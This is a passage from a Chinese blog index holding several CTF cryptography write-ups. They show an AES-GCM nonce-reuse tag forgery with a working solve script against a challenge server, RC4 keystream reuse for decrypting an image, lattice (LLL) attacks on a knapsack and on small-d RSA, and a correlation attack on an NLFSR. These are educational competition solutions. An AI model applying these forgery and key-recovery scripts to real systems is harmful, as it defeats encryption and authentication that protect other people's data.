<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">padding</span><span class="params">(s)</span>:</span></span><br><span class="line">	s = s + (<span class="number">16</span>-len(s))*<span class="string">"\x00"</span></span><br><span class="line">	<span class="keyword">return</span> s</span><br><span class="line"></span><br><span class="line">url = <span class="string">'ctf.server/test?message='</span></span><br><span class="line">forge = <span class="string">'ctf.server/flag?message='</span></span><br><span class="line"></span><br><span class="line">p = Mysocket(HOST, PORT)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> comb <span class="keyword">in</span> itertools.product(range(<span class="number">256</span>), repeat=<span class="number">3</span>):</span><br><span class="line">	m = <span class="string">''</span>.join(map(chr, comb))</span><br><span class="line">	m = <span class="string">'9cd872'</span>.decode(<span class="string">'hex'</span>)</span><br><span class="line">	<span class="keyword">if</span> sha256(url+m+<span class="string">"A"</span>*<span class="number">9</span>).digest()[:<span class="number">12</span>].startswith(<span class="string">"\x00\x00\x00"</span>):</span><br><span class="line">		<span class="keyword">print</span> (m+<span class="string">"A"</span>*<span class="number">9</span>+<span class="string">"A"</span>*<span class="number">16</span>).encode(<span class="string">'hex'</span>)</span><br><span class="line">		send = (m+<span class="string">"A"</span>*<span class="number">9</span>+<span class="string">"A"</span>*<span class="number">16</span>).encode(<span class="string">'hex'</span>)</span><br><span class="line">		nonce = sha256(url+m+<span class="string">"A"</span>*<span class="number">9</span>).digest()[:<span class="number">12</span>]</span><br><span class="line">		<span class="keyword">print</span> <span class="string">"nonce: "</span>+nonce.encode(<span class="string">'hex'</span>)</span><br><span class="line">		<span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">"MITM: "</span>)</span><br><span class="line">p.sendline(send)</span><br><span class="line">client1 = p.recvuntil(<span class="string">"MITM: "</span>)[:(<span class="number">36</span>+<span class="number">16</span>)*<span class="number">2</span>]</span><br><span class="line">c1 = client1[:<span class="number">36</span>*<span class="number">2</span>]</span><br><span class="line">t1 = client1[<span class="number">36</span>*<span class="number">2</span>:]</span><br><span class="line"><span class="keyword">print</span> <span class="string">"c1: "</span>+c1</span><br><span class="line"><span class="keyword">print</span> <span class="string">"t1: "</span>+t1</span><br><span class="line"></span><br><span class="line">p.sendline(client1+nonce[<span class="number">1</span>:].encode(<span class="string">'hex'</span>))</span><br><span class="line">server1 = p.recvuntil(<span class="string">"MITM: "</span>)[:(<span class="number">12</span>+<span class="number">16</span>)*<span class="number">2</span>]</span><br><span class="line"></span><br><span class="line">p.sendline(server1+nonce[<span class="number">2</span>:].encode(<span class="string">'hex'</span>))</span><br><span class="line">client2 = p.recvuntil(<span class="string">"MITM: "</span>)[:(<span class="number">36</span>+<span class="number">16</span>)*<span class="number">2</span>]</span><br><span class="line">c2 = client2[:<span class="number">36</span>*<span class="number">2</span>]</span><br><span class="line">t2 = client2[<span class="number">36</span>*<span class="number">2</span>:]</span><br><span class="line"><span class="keyword">print</span> <span class="string">"c2: "</span>+c2</span><br><span class="line"><span class="keyword">print</span> <span class="string">"t2: "</span>+t2</span><br><span class="line"></span><br><span class="line">c1_1 = c1[:<span class="number">32</span>].decode(<span class="string">'hex'</span>)</span><br><span class="line">c1_2 = c1[<span class="number">32</span>:<span class="number">64</span>].decode(<span class="string">'hex'</span>)</span><br><span class="line">c1_3 = padding(c1[<span class="number">64</span>:<span class="number">64</span>+<span class="number">4</span>*<span class="number">2</span>].decode(<span class="string">'hex'</span>))</span><br><span class="line">t1 = t1.decode(<span class="string">'hex'</span>)</span><br><span class="line"></span><br><span class="line">c2_1 = c2[:<span class="number">32</span>].decode(<span class="string">'hex'</span>)</span><br><span class="line">c2_2 = c2[<span class="number">32</span>:<span class="number">64</span>].decode(<span class="string">'hex'</span>)</span><br><span class="line">c2_3 = padding(c2[<span class="number">64</span>:<span class="number">64</span>+<span class="number">4</span>*<span class="number">2</span>].decode(<span class="string">'hex'</span>))</span><br><span class="line">t2 = t2.decode(<span class="string">'hex'</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># (c1_2+c2_2) * X^3 + (c1_3+c2_3) * X^2 + t1 + t2 = 0</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">bytes_to_poly</span><span class="params">(block, a)</span>:</span></span><br><span class="line">	f = <span class="number">0</span></span><br><span class="line">	bits = bin(bytes_to_long(block))[<span class="number">2</span>:].zfill(<span class="number">128</span>)</span><br><span class="line">	<span class="keyword">for</span> e, bit <span class="keyword">in</span> enumerate(bits):</span><br><span class="line">		f += int(bit) * a**e</span><br><span class="line">	<span class="keyword">return</span> f </span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">poly_to_bytes</span><span class="params">(poly)</span>:</span></span><br><span class="line">    a = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i, bit <span class="keyword">in</span> enumerate(poly._vector_()):</span><br><span class="line">        a |= int(bit) &lt;&lt; (<span class="number">127</span> - i)</span><br><span class="line">    <span class="keyword">return</span> long_to_bytes(a)</span><br><span class="line"></span><br><span class="line">F, a = GF(<span class="number">2</span>**<span class="number">128</span>, name=<span class="string">"a"</span>).objgen()</span><br><span class="line">R, X = PolynomialRing(F, name=<span class="string">"X"</span>).objgen()</span><br><span class="line"></span><br><span class="line">C1_1 = bytes_to_poly(c1_1, a)</span><br><span class="line">C1_2 = bytes_to_poly(c1_2, a)</span><br><span class="line">C1_3 = bytes_to_poly(c1_3, a)</span><br><span class="line">T1 = bytes_to_poly(t1, a)</span><br><span class="line"></span><br><span class="line">C2_2 = bytes_to_poly(c2_2, a)</span><br><span class="line">C2_3 = bytes_to_poly(c2_3, a)</span><br><span class="line">T2 = bytes_to_poly(t2, a)</span><br><span class="line"></span><br><span class="line">len_aad = <span class="number">11</span></span><br><span class="line">len_txt = <span class="number">36</span></span><br><span class="line">L = long_to_bytes(((<span class="number">8</span> * len_aad) &lt;&lt; <span class="number">64</span>) | (<span class="number">8</span> * len_txt))</span><br><span class="line">L = bytes_to_poly(L, a)</span><br><span class="line">A = bytes_to_poly(padding(<span class="string">"from client"</span>), a)</span><br><span class="line"></span><br><span class="line"><span class="comment"># f(x) = 0</span></span><br><span class="line">f = (C1_2+C2_2) * X**<span class="number">3</span> + (C1_3+C2_3) * X**<span class="number">2</span> + T1 + T2</span><br><span class="line"><span class="comment"># f1(X) = S</span></span><br><span class="line">f1 = A * X**<span class="number">5</span> + C1_1 * X**<span class="number">4</span> + C1_2 * X**<span class="number">3</span> + C1_3 * X**<span class="number">2</span> + L * X + T1</span><br><span class="line"></span><br><span class="line">G1 = bytes_to_poly(c1_1[:<span class="number">11</span>] + strxor(strxor(c1_1[<span class="number">11</span>:<span class="number">15</span>], <span class="string">"flag"</span>), <span class="string">"test"</span>) + c1_1[<span class="number">15</span>:], a)</span><br><span class="line">G2 = C1_2</span><br><span class="line">G3 = C1_3</span><br><span class="line"><span class="comment"># f2(X) + S = forge_tag</span></span><br><span class="line">f2 = A * X**<span class="number">5</span> + G1 * X**<span class="number">4</span> + G2 * X**<span class="number">3</span> + G3 * X**<span class="number">2</span> + L * X</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> root, _ <span class="keyword">in</span> f.roots():</span><br><span class="line">	<span class="comment"># print root</span></span><br><span class="line">	<span class="keyword">print</span> <span class="string">"H: "</span>+poly_to_bytes(root).encode(<span class="string">'hex'</span>)</span><br><span class="line">	S = f1(root)</span><br><span class="line">	forge_tag = poly_to_bytes(f2(root) + S)</span><br><span class="line">	send = c1_1[:<span class="number">11</span>] + strxor(strxor(c1_1[<span class="number">11</span>:<span class="number">15</span>], <span class="string">"flag"</span>), <span class="string">"test"</span>) + c1[<span class="number">30</span>:].decode(<span class="string">'hex'</span>) + forge_tag + nonce[<span class="number">3</span>:]</span><br><span class="line">	send = send.encode(<span class="string">'hex'</span>)</span><br><span class="line">	p.sendline(send)</span><br><span class="line">	flag = p.recvuntil(<span class="string">"\n"</span>)</span><br><span class="line">	<span class="keyword">print</span> <span class="string">"flag: "</span>+flag</span><br><span class="line">	flag = flag[:-(<span class="number">9</span>+<span class="number">16</span>)*<span class="number">2</span>].decode(<span class="string">'hex'</span>)</span><br><span class="line">	flag = strxor(strxor(flag, c1.decode(<span class="string">'hex'</span>)[:len(flag)]), url[:len(flag)])</span><br><span class="line">	<span class="keyword">print</span> flag</span><br><span class="line">	<span class="keyword">break</span></span><br></pre></td></tr></table></figure>
<p>完整代码详见<a href="https://github.com/zrax-x/CTF/blob/master/2020-5space/solve.py" target="_blank" rel="noopener">solve.py</a></p>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>​    尽管nonce重用攻击在以往的比赛中已经出现过，但是在这次比赛中的题目很好的加入了新的元素，在增加题目难度的同时也很好了保证了题目的质量。</p>
<p>参考链接</p>
<p><a href="https://github.com/ashutosh1206/Crypton/tree/master/Authenticated-Encryption/AES-GCM/Attack-Forbidden" target="_blank" rel="noopener">https://github.com/ashutosh1206/Crypton/tree/master/Authenticated-Encryption/AES-GCM/Attack-Forbidden</a> </p>
<p>文章转载自安全客<a href="https://www.anquanke.com/post/id/209203" target="_blank" rel="noopener">https://www.anquanke.com/post/id/209203</a> </p>

      
    </div>
    
    <div class="article-info article-info-index">
      
      

      
    <div class="article-tag tagcloud">
        <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/AES/" rel="tag">AES</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/CTF/" rel="tag">CTF</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E5%AF%86%E7%A0%81%E5%AD%A6/" rel="tag">密码学</a></li></ul>
    </div>

      
      <div class="clearfix"></div>
    </div>
    
  </div>
  
</article>









  
    <article id="post-安恒五月赛BJD&amp;DAS" class="article article-type-post" itemscope itemprop="blogPost">
  
    <div class="article-meta">
      <a href="/2020/05/26/%E5%AE%89%E6%81%92%E4%BA%94%E6%9C%88%E8%B5%9BBJD&DAS/" class="article-date">
      <time datetime="2020-05-26T07:00:00.000Z" itemprop="datePublished">2020-05-26</time>
</a>


    </div>
  
  <div class="article-inner">
    
      <input type="hidden" class="isFancy" />
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2020/05/26/%E5%AE%89%E6%81%92%E4%BA%94%E6%9C%88%E8%B5%9BBJD&DAS/">安恒五月赛BJD&amp;DAS</a>
    </h1>
  

      </header>
      
    
    <div class="article-entry" itemprop="articleBody">
      
          
        <h2 id="Encrypt-Img"><a href="#Encrypt-Img" class="headerlink" title="Encrypt_Img"></a>Encrypt_Img</h2><p>题目本身不难，比赛时没有注意到两次加密的是同一张图片，所以没有做出来。</p>
<p>做法比较简单，因为两个plaintext长度不等（这里是相差一个字节）。因此通过异或plaintext1和ciphertext1的最后一个字节我们可以得到RC4此时产生key，而两次加密时RC4所产生的密钥流显然是一样的，因此可以用这个key去解出图片的第一个像素点，记为p1。同时我们知道两张图片是相同的，因此通过p1和第一次加密的图片的第一个像素点，我们又可以拿到下一个key，用它来解密第二次加密时的第二个像素点，以此类推，最终解出整张图片。</p>
<p>赛后简单的写了下脚本</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># author : zraxx</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> numpy <span class="keyword">import</span> array</span><br><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"></span><br><span class="line">Plaintext1 = <span class="string">"RC4IsInteresting"</span></span><br><span class="line"></span><br><span class="line">enc1_file = Image.open(<span class="string">r"enc1.png"</span>)</span><br><span class="line">enc2_file = Image.open(<span class="string">r"enc2.png"</span>)</span><br><span class="line">img1 = array(enc1_file)</span><br><span class="line">img2 = array(enc2_file)</span><br><span class="line">a, b, _ = img1.shape</span><br><span class="line">ciphertext1 = <span class="number">12078640933356268898100798377710191641</span></span><br><span class="line">m = ord(<span class="string">'g'</span>)</span><br><span class="line">c = int(hex(ciphertext1).strip(<span class="string">'L'</span>)[<span class="number">-2</span>:],<span class="number">16</span>)</span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> range(<span class="number">0</span>, a):</span><br><span class="line">    <span class="keyword">for</span> y <span class="keyword">in</span> range(<span class="number">0</span>, b):</span><br><span class="line">        pixel2 = img2[x, y]</span><br><span class="line">        pixel1 = img1[x, y]</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>, <span class="number">3</span>):</span><br><span class="line">            k = (c ^ m)</span><br><span class="line">            c = pixel2[i] <span class="comment"># get ciphertext of img2</span></span><br><span class="line">            pixel2[i] = pixel2[i] ^ k  </span><br><span class="line">            m = pixel2[i] <span class="comment"># get plaintext of img2 and img1</span></span><br><span class="line">            c = pixel1[i] <span class="comment"># get ciphertext of img1</span></span><br><span class="line">        img2[x][y] = pixel2</span><br><span class="line">enc = Image.fromarray(img2)</span><br><span class="line">enc.save(<span class="string">"flag.png"</span>)</span><br></pre></td></tr></table></figure>
<h2 id="backpacker"><a href="#backpacker" class="headerlink" title="backpacker"></a>backpacker</h2><p>这是一个利用LLL的攻击，比赛时还没有接触过这类题目，所以没有解出来。之后在网上搜索资料看到相关的攻击方法，记录一下。</p>
<p><img src="/2020/05/26/%E5%AE%89%E6%81%92%E4%BA%94%E6%9C%88%E8%B5%9BBJD&DAS/1591426710827.png" alt="theory"></p>
<p>按文中给出的方法构造矩阵，然后求LLL，对其中的行向量（只包含-1或1）进行处理（-1转为0），即得到了我们的明文。</p>

      
    </div>
    
    <div class="article-info article-info-index">
      
      

      
    <div class="article-tag tagcloud">
        <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/CTF-%E5%AF%86%E7%A0%81%E5%AD%A6-LLL/" rel="tag">CTF - 密码学 - LLL</a></li></ul>
    </div>

      
      <div class="clearfix"></div>
    </div>
    
  </div>
  
</article>









  
    <article id="post-De1CTF[2020]-NLFSR" class="article article-type-post" itemscope itemprop="blogPost">
  
    <div class="article-meta">
      <a href="/2020/05/11/De1CTF%5B2020%5D-NLFSR/" class="article-date">
      <time datetime="2020-05-11T07:00:00.000Z" itemprop="datePublished">2020-05-11</time>
</a>


    </div>
  
  <div class="article-inner">
    
      <input type="hidden" class="isFancy" />
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2020/05/11/De1CTF%5B2020%5D-NLFSR/">De1CTF[2020]-NLFSR</a>
    </h1>
  

      </header>
      
    
    <div class="article-entry" itemprop="articleBody">
      
          
        <p>首先看一下题目源码</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flag <span class="keyword">import</span> a, b, c, d, flag</span><br><span class="line"><span class="keyword">assert</span> flag == <span class="string">"De1CTF&#123;"</span> + <span class="string">''</span>.join([hex(i)[<span class="number">2</span>:] <span class="keyword">for</span> i <span class="keyword">in</span> [a, b, c, d]]) + <span class="string">"&#125;"</span></span><br><span class="line"><span class="keyword">assert</span> [len(bin(i)[<span class="number">2</span>:]) <span class="keyword">for</span> i <span class="keyword">in</span> [a, b, c, d]] == [<span class="number">19</span>, <span class="number">19</span>, <span class="number">13</span>, <span class="number">6</span>]</span><br><span class="line"></span><br><span class="line">ma, mb, mc, md = <span class="number">0x505a1</span>, <span class="number">0x40f3f</span>, <span class="number">0x1f02</span>, <span class="number">0x31</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">lfsr</span><span class="params">(r, m)</span>:</span> <span class="keyword">return</span> ((r &lt;&lt; <span class="number">1</span>) &amp; <span class="number">0xffffff</span>) ^ (bin(r &amp; m).count(<span class="string">'1'</span>) % <span class="number">2</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">combine</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">global</span> a, b, c, d</span><br><span class="line">    a = lfsr(a, ma)</span><br><span class="line">    b = lfsr(b, mb)</span><br><span class="line">    c = lfsr(c, mc)</span><br><span class="line">    d = lfsr(d, md)</span><br><span class="line">    [ao, bo, co, do] = [i &amp; <span class="number">1</span> <span class="keyword">for</span> i <span class="keyword">in</span> [a, b, c, d]]</span><br><span class="line">    <span class="keyword">return</span> (ao*bo) ^ (bo*co) ^ (bo*do) ^ co ^ do</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">genkey</span><span class="params">(nb)</span>:</span></span><br><span class="line">    s = <span class="string">''</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(nb*<span class="number">8</span>):</span><br><span class="line">        s += str(combine())</span><br><span class="line">    open(<span class="string">"data"</span>, <span class="string">"w+"</span>).write(s)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">genkey(<span class="number">128</span>*<span class="number">1024</span>)</span><br></pre></td></tr></table></figure>
<p>可以看出这个属于非线性组合生成器 </p>
<p>可以参考<a href="https://ctf-wiki.github.io/ctf-wiki/crypto/streamcipher/fsr/nfsr-zh/" target="_blank" rel="noopener">CTF-WIKI</a>关于相关攻击的介绍</p>
<p>回到本题目中，我们可以用脚本测试一下有哪些相关性，这里我们可以观察到有三组相关性</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">suma = <span class="number">0</span></span><br><span class="line">sumb = <span class="number">0</span></span><br><span class="line">sumc = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> ao <span class="keyword">in</span> range(<span class="number">2</span>):</span><br><span class="line">	<span class="keyword">for</span> bo <span class="keyword">in</span> range(<span class="number">2</span>):</span><br><span class="line">		<span class="keyword">for</span> co <span class="keyword">in</span> range(<span class="number">2</span>):</span><br><span class="line">			<span class="keyword">for</span> do <span class="keyword">in</span> range(<span class="number">2</span>):</span><br><span class="line">				o = (ao*bo) ^ (bo*co) ^ (bo*do) ^ co ^ do</span><br><span class="line">				suma += ao==o</span><br><span class="line">				sumb += (<span class="number">1</span>-(ao^bo))==o</span><br><span class="line">				sumc += (co^do)==o</span><br><span class="line">				</span><br><span class="line"><span class="keyword">print</span> suma*<span class="number">1.0</span>/<span class="number">16</span></span><br><span class="line"><span class="keyword">print</span> sumb*<span class="number">1.0</span>/<span class="number">16</span></span><br><span class="line"><span class="keyword">print</span> sumc*<span class="number">1.0</span>/<span class="number">16</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">0.75</span></span><br><span class="line"><span class="string">0.75</span></span><br><span class="line"><span class="string">0.75</span></span><br><span class="line"><span class="string">'''</span></span><br></pre></td></tr></table></figure>
<p>因此我们可以首先恢复出a，然后根据a恢复出b，同时c，d也能直接恢复</p>

      
    </div>
    
    <div class="article-info article-info-index">
      
      

      
    <div class="article-tag tagcloud">
        <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/LFSR/" rel="tag">LFSR</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E5%AF%86%E7%A0%81%E5%AD%A6/" rel="tag">密码学</a></li></ul>
    </div>

      
      <div class="clearfix"></div>
    </div>
    
  </div>
  
</article>









  
    <article id="post-De1CTF[2020]-easyRSA" class="article article-type-post" itemscope itemprop="blogPost">
  
    <div class="article-meta">
      <a href="/2020/05/11/De1CTF%5B2020%5D-easyRSA/" class="article-date">
      <time datetime="2020-05-11T07:00:00.000Z" itemprop="datePublished">2020-05-11</time>
</a>


    </div>
  
  <div class="article-inner">
    
      <input type="hidden" class="isFancy" />
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2020/05/11/De1CTF%5B2020%5D-easyRSA/">De1CTF[2020]-easyRSA</a>
    </h1>
  

      </header>
      
    
    <div class="article-entry" itemprop="articleBody">
      
          
        <p>题目源码</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">from</span> FLAG <span class="keyword">import</span> flag</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">genE</span><span class="params">(lcm,limit)</span>:</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        r = random.randint(limit,limit*<span class="number">0x1000000000001</span>)</span><br><span class="line">        d = gmpy2.next_prime(r)</span><br><span class="line">        e = gmpy2.invert(d,lcm)</span><br><span class="line">        <span class="keyword">if</span> isPrime(e):</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">return</span> e</span><br><span class="line"></span><br><span class="line">p = getStrongPrime(<span class="number">1024</span>)</span><br><span class="line">q = getStrongPrime(<span class="number">1024</span>)</span><br><span class="line">n = p*q</span><br><span class="line">lcm = gmpy2.lcm(p<span class="number">-1</span>,q<span class="number">-1</span>)</span><br><span class="line">limit = gmpy2.iroot(n,<span class="number">3</span>)[<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line">e1 = genE(lcm,limit)</span><br><span class="line">e2 = genE(lcm,limit)</span><br><span class="line"></span><br><span class="line">phi = (p<span class="number">-1</span>)*(q<span class="number">-1</span>)</span><br><span class="line">d1 = gmpy2.invert(e1,phi)</span><br><span class="line">d2 = gmpy2.invert(e2,phi)</span><br><span class="line"></span><br><span class="line">e = [e1,e2]</span><br><span class="line">plain = bytes_to_long(flag)</span><br><span class="line">cipher = pow(plain,e[random.getrandbits(<span class="number">1</span>)],n)</span><br><span class="line"></span><br><span class="line">print(<span class="string">'N:'</span> + str(n))</span><br><span class="line">print(<span class="string">'e1:'</span> + str(e1))</span><br><span class="line">print(<span class="string">'e2:'</span> + str(e2))</span><br><span class="line">print(<span class="string">'cipher:'</span> + str(cipher))</span><br></pre></td></tr></table></figure>
<p>用n计算了两对e，d，其中d都比较小</p>
<p>这里需要参考这篇论文<a href="https://link.springer.com/content/pdf/10.1007%2F3-540-46701-7_14.pdf" target="_blank" rel="noopener">https://link.springer.com/content/pdf/10.1007%2F3-540-46701-7_14.pdf</a> </p>
<p>论文的结论就是给出多对e,d，其中$d&lt;N^α$，就可以分解N</p>
<p>这里当给出2对e，d时需要满足$d&lt;N^{5/14}$，观察题目就可以发现满足该不等式。</p>
<p>因此我们构造矩阵</p>
<p>$B = \begin{bmatrix}1 &amp; -N &amp; 0 &amp; N^2 \\  &amp; e_1 &amp; - e_1 &amp; -e_1N\\ &amp; &amp; e_2 &amp; -e_2N \\ &amp; &amp; &amp; e_1e_2\end{bmatrix}$</p>
<p>$D = \begin{bmatrix}N &amp;  &amp;  &amp;  \\  &amp;  N^{(1/2)} &amp; &amp; \\ &amp; &amp; N^{1+\delta_2} &amp;  \\ &amp; &amp; &amp; 1\end{bmatrix}$</p>
<p>$L=B*D$</p>
<p>同时需要求解的向量$v = (k_1k_2,k_2(g-k_1s),g(k_1-k_2),(g-k_1s)(g-k_2s))$</p>
<p>之后对$L$求$LLL$，记为$L_2$</p>
<p>于是$v = L_2[0]*L^{-1}$</p>
<p>之后便可得到$\Phi(N)=e_1*v[1]/v[0]​$，进而求得明文</p>

      
    </div>
    
    <div class="article-info article-info-index">
      
      

      
    <div class="article-tag tagcloud">
        <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/CTF/" rel="tag">CTF</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/RSA/" rel="tag">RSA</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E5%AF%86%E7%A0%81%E5%AD%A6/" rel="tag">密码学</a></li></ul>
    </div>

      
      <div class="clearfix"></div>
    </div>
    
  </div>
  
</article>









  
    <article id="post-De1CTF[2020]-ECDH" class="article article-type-post" itemscope itemprop="blogPost">
  
    <div class="article-meta">
      <a href="/2020/05/11/De1CTF%5B2020%5D-ECDH/" class="article-date">
      <time datetime="2020-05-11T07:00:00.000Z" itemprop="datePublished">2020-05-11</time>
</a>


    </div>
  
  <div class="article-inner">
    
      <input type="hidden" class="isFancy" />
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2020/05/11/De1CTF%5B2020%5D-ECDH/">De1CTF[2020]-ECDH</a>
    </h1>
  

      </header>
      
    
    <div class="article-entry" itemprop="articleBody">
      
          
        <p>定位到题目源码中最关键的部分——密钥交换</p>
